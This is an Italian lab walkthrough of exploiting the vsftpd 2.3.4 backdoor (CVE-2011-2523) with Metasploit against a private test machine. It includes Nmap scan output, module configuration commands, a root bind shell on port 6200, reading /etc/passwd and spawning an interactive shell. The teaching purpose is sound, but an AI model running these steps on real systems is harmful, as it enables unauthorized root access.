# FTP

In questa sezione andremo a realizzare un attacco sul servizio FTP, in particolare sfrutteremo una vulnerabilità molto nota relativa al server FTP vsftpd (acronimo di Very Secure FTP Daemon n.d.r.), daemon molto utilizzato nei sistemi *nix. In realtà questa vulnerabilità non deriva da un bug nel codice, bensì dalla compromissione del sito web ufficiale sul quale un attaccante ha caricato una versione del programma compilato con una backdoor che permette, facendo login con uno smile ":)" di ottenere una bind shell sulla porta 6200. Sebbene questa compromissione fu scoperta molto velocemente, un gran numero di persone ha comunque scaricato questa versione del software (v2.3.4).

Riprendendo l'output dell'enumeration effettuata in precedenza sulla macchina target notiamo che la versione installata di vsftpd è proprio quella incriminata ed è quindi molto probabile sia vulnerabile a questo exploit.

```
[*] Nmap: PORT      STATE  SERVICE
[*] Nmap: 21/tcp    open   ftp
[*] Nmap: | ftp-vsftpd-backdoor:
[*] Nmap: |   VULNERABLE:
[*] Nmap: |   vsFTPd version 2.3.4 backdoor
[*] Nmap: |     State: VULNERABLE (Exploitable)
[*] Nmap: |     IDs:  BID:48539  CVE:CVE-2011-2523
[*] Nmap: |       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
[*] Nmap: |     Disclosure date: 2011-07-03
[*] Nmap: |     Exploit results:
[*] Nmap: |       Shell command: id
[*] Nmap: |       Results: uid=0(root) gid=0(root)
[*] Nmap: |     References:
[*] Nmap: |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
[*] Nmap: |       https://www.securityfocus.com/bid/48539
[*] Nmap: |       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
[*] Nmap: |_      http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.htmltatus
```

Possiamo attaccare il target in diversi modi, sul sito [exploit-db.com](exploit-db.com) troviamo ad esempio uno [script Pyhton](https://www.exploit-db.com/exploits/49757) che ci consente di ottenere automaticamente la shell, ma noi siamo interessati all'utilizzo di Metasploit ed è quindi questo il tool che andremo a sfruttare.

Prima cosa da fare è cercare se tra i moduli degli exploit presenti ce n'è uno relativo al servizio che vogliamo attaccare, lanciamo quindi il comando `search name:vsftpd` la cui esecuzione produce il seguente output:

```
msf6 > search name:vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
```

Come si vede la ricerca ha avuto esito positivo, è stato trovato il modulo relativo all'exploit di vsfptd v2.3.4. Come il terminale ci suggerisce possiamo lanciare il comando `info 0` per ottenere tutte le informazioni relative a questo modulo.


```
msf6 > info 0

       Name: VSFTPD v2.3.4 Backdoor Command Execution
     Module: exploit/unix/ftp/vsftpd_234_backdoor
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2011-07-03

Provided by:
  hdm <x@hdm.io>
  MC <mc@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT   21               yes       The target port (TCP)

Payload information:
  Space: 2000
  Avoid: 0 characters

Description:
  This module exploits a malicious backdoor that was added to the 
  VSFTPD download archive. This backdoor was introduced into the 
  vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 
  according to the most recent information available. This backdoor 
  was removed on July 3rd 2011.

References:
  OSVDB (73573)
  http://pastebin.com/AetT9sS5
  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
```

Nella descrizione si legge proprio quanto detto prima sulla backdoor, ovvero che è stata inserita da un attaccante nei repository di vsftpd nel 2011 ed è stata rimossa dopo circa due giorni. Per utilizzare l'exploit basta ora digitare `use 0` per caricare il modulo dell' exploit e dopo `show options` per ottenere una lista delle opzioni configurabili prima dell'esecuzione.

```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic

```

Tra le opzioni del modulo troviamp __RHOSTS__, dove inseriremo l'ip del target e __RPORT__ dove inserire opzionalmente il porto del target, nel caso fosse diverso da 21. Per configurare l'ip basta digitare `set RHOSTS 192.168.56.102`. Per ottenere i payloads disponibili per il modulo digitiamo `show payloads`, in questo caso si nota che è presente un solo payload, che sarà ovviamente quello di default, pertanto non è necessaria nessuna ulteriore configurazione. A questo punto per lanciare l'attacco basta digitare il comando `exploit`.


<img src="/imgs/vsftpd_exploit.png" width="800"> </br>

Siamo dunque entrati in possesso di una shell remota, in particolare sul porto 6200 e abbiamo inoltre i privilegi di amministratore come si nota dall'esecuzione del comando `whoami` e dal fatto che siamo riusciti a leggere il file protetto `/etc/passwd` contenente tutte le informazioni sugli utenti del sistema. Ultimo step che compieremo è quello di fare lo spawn di una shell interattiva bash tramite l'uso di python.

<img src="/imgs/vsftpd_intshell.png" width="800"> </br>




